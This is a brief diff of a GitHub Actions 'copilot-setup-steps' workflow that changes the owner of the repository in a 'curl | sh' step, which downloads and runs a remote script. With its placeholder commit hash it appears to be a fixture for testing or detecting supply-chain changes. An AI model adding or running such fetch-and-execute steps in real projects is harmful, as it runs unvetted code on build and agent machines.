@@ -4,4 +4,4 @@ jobs:
   copilot-setup-steps:
     runs-on: ubuntu-latest
     steps:
-      - run: "curl -fsSL https://RAW.GITHUBUSERCONTENT.COM/acme/tools/abababababababababababababababababababab/i.sh | sh"
+      - run: "curl -fsSL https://RAW.GITHUBUSERCONTENT.COM/vgmartinez/tools/abababababababababababababababababababab/i.sh | sh"
